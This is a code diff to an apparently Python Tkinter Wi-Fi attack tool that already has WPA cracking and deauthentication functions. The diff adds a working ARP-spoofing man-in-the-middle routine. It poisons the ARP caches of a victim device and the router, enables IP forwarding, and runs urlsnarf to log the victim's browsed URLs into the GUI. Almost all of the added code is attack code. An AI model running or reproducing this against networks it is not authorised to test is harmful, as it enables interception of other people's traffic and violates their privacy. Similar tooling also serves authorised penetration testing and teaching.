@@ -347,8 +347,7 @@ def crack_wpa(root, scan_btn, stop_attack_btn, T, tree, interface, tree_on_right
                     # break from the inner loop, so that we stop reading the file
                     break
 
-                # TODO another if to report the progress
-                # maybe make a fancy progress bar
+                # progress bar stuff
                 if "%" in line:
                     # that's the progress percentage
                     percentages = re.findall("\d+\.\d+%", line)
@@ -488,3 +487,139 @@ def deauth_client(dev_mac_address, ap_mac_address, channel, root, scan_btn, stop
     tools.addToolInfo(T, "Monitor mode disabled for " + str(interface) + "\n\n")
 
     stopped_attack(tree, scan_btn, stop_attack_btn, tree_on_right_click)
+
+
+def arpspoof(dev_mac_address, ap_mac_address, channel, root, scan_btn, stop_attack_btn, T, tree, interface, tree_on_right_click):
+
+    # the selected entry in the devices treeview
+    sel_item = tree.item(tree.focus())
+
+    # FIRST, check if attacker is connected to same wifi network as victim
+    try:
+        attacker_wifi_mac = subprocess.check_output(["iwgetid -ar"], stderr=subprocess.STDOUT, shell=True).decode('utf-8')
+        victim_wifi_mac = sel_item["values"][3] if len(sel_item["values"]) > 3 else None
+
+        if attacker_wifi_mac != victim_wifi_mac:
+            tools.addToolInfo(T, "Please connect to the same Wi-Fi network as the target device first.")
+            return
+
+    except:
+        # most probably monitor mode has just been called, needs a few secs before wifi interface is available again
+        tools.addToolInfo(T, "Could not get Wi-Fi mac address. Make sure your Wi-Fi interface is up, then try again.")
+        return
+
+    # update the UI to show that the attack started
+    attack_launched(tree, scan_btn, stop_attack_btn)
+
+    # getting client IP address:
+    # a- if already found before, it should be listed in the selected item, column 6
+    if len(sel_item["values"]) > 5 and sel_item["values"][5] and sel_item["values"][5] != "-":
+        target_ip = sel_item["values"][5]
+
+    # b- otherwise, get the taget's IP address (active method)
+    else:
+        tools.addToolInfo(T, "Getting the required IP addresses...\n\n")
+        target_ip = tools.get_client_ip(dev_mac_address, T, tree, interface)
+
+    # c- in case the first execution fails, keep trying
+    while not target_ip:
+        tools.addToolInfo(T, "Failed to find the client's IP. Trying again...\n\n")
+        target_ip = tools.get_client_ip(dev_mac_address, T, tree, interface)
+    
+    attacker_ip = tools.get_local_ip()
+    router_ip = tools.get_router_ip()
+
+    # start arpspoofing
+    try:
+        tools.addToolInfo(T, "Launching arpspoof from victim to router...\n\n")
+        arpspoof1 = subprocess.Popen([f"arpspoof -i {interface} -t {target_ip} {router_ip}"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+        time.sleep(1)
+
+        tools.addToolInfo(T, "Launching arpspoof from router to victim...\n\n")
+        arpspoof2 = subprocess.Popen([f"arpspoof -i {interface} -t {router_ip} {target_ip}"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+        time.sleep(1)
+
+        # turn on packet forwarding
+        subprocess.getoutput("sysctl -w net.ipv4.ip_forward=1")
+
+        tools.addToolInfo(T, "Arpspoof launched.")
+
+
+        # current dir
+        cwd = os.path.dirname(os.path.realpath(__file__))
+
+        # path of output csv file
+        out_path = os.path.join(cwd, "temp_urlsnarf.txt")
+        if os.path.exists(out_path):
+            os.remove(out_path)
+
+        # running urlsnarf
+        urlsnarf = None
+        
+        with open(out_path, "w") as f:
+            urlsnarf = subprocess.Popen([f"urlsnarf -i {interface}"], shell=True, stdout=f, stderr=subprocess.STDOUT)
+
+        write_output(T, "", tag="urlsnarf")
+
+        # keep the attack running until user presses "Stop Attack"
+        # and update screen with new output every 1 sec
+        while True:
+
+            with open(out_path, "r") as f:
+                output = f.read()
+                # do something with output
+                update_output(T, output + "\n", tag="urlsnarf")
+
+            # when user clicks "Stop Attack"
+            if globs.stop_attack:
+                globs.stop_attack = False
+
+                # kill the running processes
+                arpspoof1.kill()
+                arpspoof2.kill()
+                urlsnarf.kill()
+                
+                # turn off packet forwarding
+                subprocess.getoutput("sysctl -w net.ipv4.ip_forward=0")
+
+                tools.addToolInfo(T, "Stopped ARP Spoof MITM attack.\n\n")
+                stopped = True 
+                break
+        
+            time.sleep(1)
+
+    except Exception as e:
+        print(e)
+        tools.addToolInfo(T, "Something went wrong. Please try again.")
+
+        if arpspoof1:
+            arpspoof1.kill()
+
+        if arpspoof2:
+            arpspoof2.kill()
+
+        if urlsnarf:
+            urlsnarf.kill()
+        
+        # turn off packet forwarding
+        subprocess.getoutput("sysctl -w net.ipv4.ip_forward=0")
+
+        stopped_attack(tree, scan_btn, stop_attack_btn, tree_on_right_click)
+        
+        return
+    
+    finally:
+        stopped_attack(tree, scan_btn, stop_attack_btn, tree_on_right_click)
+
+
+def write_output(T, msg, tag="output"):
+    tools.addToolInfo(T, msg, tag)
+
+def update_output(T, msg, tag="output"):
+    T.configure(state="normal")
+    last_insert = T.tag_ranges(tag)
+    if len(last_insert) > 0:
+        T.delete(last_insert[0], last_insert[1])
+    # T.delete("end-1c linestart", "end")
+    write_output(T, msg, tag)
+    T.configure(state="disabled")
